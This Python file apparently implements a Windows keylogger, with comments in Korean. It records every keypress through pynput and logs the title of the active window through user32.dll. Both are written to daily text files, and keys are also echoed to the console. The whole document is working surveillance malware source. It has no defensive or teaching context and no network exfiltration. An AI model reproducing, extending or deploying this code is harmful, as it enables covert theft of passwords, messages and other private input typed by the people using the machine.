import ctypes
from threading import Thread
from pynput.keyboard import Key, Listener
from datetime import datetime

old_buffer = ""
now_buffer = ""
now = datetime.now()
today = "{}-{}-{}".format(now.year, now.month, now.day)
time = "{}:{}:{}".format(now.hour, now.minute, now.second)

def getwindow():
    global old_buffer
    global now_buffer
    while True:
        lib = ctypes.windll.LoadLibrary('user32.dll')
        handle = lib.GetForegroundWindow() # 활성화된 윈도우의 핸들얻음
        buffer = ctypes.create_unicode_buffer(255) # 타이틀을 저장할 버퍼 크기 지정
        lib.GetWindowTextW(handle, buffer, ctypes.sizeof(buffer)) # 버퍼에 타이틀 저장
        now_buffer = buffer.value
        now_buffer = "[{}]".format(now_buffer)
        now_buffer = now_buffer.replace("[]","")
        if old_buffer != now_buffer:
            f = open("log/{}.txt".format(today), mode="a", encoding="utf-8")
            f.write(now_buffer + "\n")
            f.close()
            old_buffer = now_buffer
        else:
            pass
        
def on_press(key):
    f = open("log/{}.txt".format(today), mode="a", encoding="utf-8")
    f.write("{0}".format(key))
    f.close()
    print('{0}'.format(key))

gwThread = Thread(target = getwindow)
gwThread.start()

with Listener(on_press=on_press) as listener:
    listener.join()